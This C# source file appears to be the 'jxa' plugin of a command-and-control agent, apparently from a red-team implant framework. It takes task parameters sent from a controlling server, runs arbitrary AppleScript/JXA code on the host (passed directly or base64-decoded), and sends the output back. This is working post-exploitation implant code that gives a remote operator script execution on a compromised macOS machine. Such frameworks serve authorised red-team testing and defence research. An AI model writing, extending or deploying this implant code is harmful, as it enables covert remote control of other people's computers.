using Agent.Interfaces;
using Agent.Models;
using System.Runtime.InteropServices;
using System.Text;
using OSXIntegration.Framework;
using Agent.Framework;
using System.Text.Json;
using jxa;
using System.Text.Json.Serialization;
using Agent.Utilities;
namespace Agent
{
    public class Plugin : IPlugin
    {
        public string Name => "jxa";
        private IMessageManager messageManager { get; set; }

        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner)
        {
            this.messageManager = messageManager;
        }

        public async Task Execute(ServerJob job)
        {
            JxaArgs args = JsonSerializer.Deserialize<JxaArgs>(job.task.parameters);
            try
            {
                if (!string.IsNullOrEmpty(args.code))
                {
                    await messageManager.WriteLine(AppleScript.Run(args.code), job.task.id, true);
                }
                else if (!string.IsNullOrEmpty(args.scriptcontents))
                {
                    await messageManager.WriteLine(AppleScript.Run(Misc.Base64DecodeToByteArray(args.scriptcontents)), job.task.id, true);
                }
                else
                {
                    await messageManager.WriteLine("No valid scripts provided", job.task.id, true);
                }
            }
            catch (Exception e)
            {
                await messageManager.WriteLine(e.ToString(), job.task.id, true);
            }
        }
    }
}
